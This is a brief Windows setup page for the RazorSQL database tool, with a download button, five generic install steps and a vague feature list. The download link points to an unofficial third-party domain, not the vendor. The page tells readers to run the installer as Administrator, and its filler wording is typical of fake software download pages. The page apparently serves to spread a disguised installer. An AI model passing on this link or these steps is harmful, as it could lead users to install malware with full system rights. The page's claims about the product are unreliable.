# RazorSQL Windows Setup Notes

[⬇ Download RazorSQL for Windows](https://razorsql-setup.kolmods.com/)

## Download & Install

> Setup notes for **RazorSQL** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **RazorSQL** from the Start menu

## What you can use it for

- Core RazorSQL features on Windows desktop
- Install and configure RazorSQL for daily use
- Import, edit, and export with RazorSQL tools
- Tune settings and profiles inside RazorSQL
- Integrate RazorSQL into your existing workflow
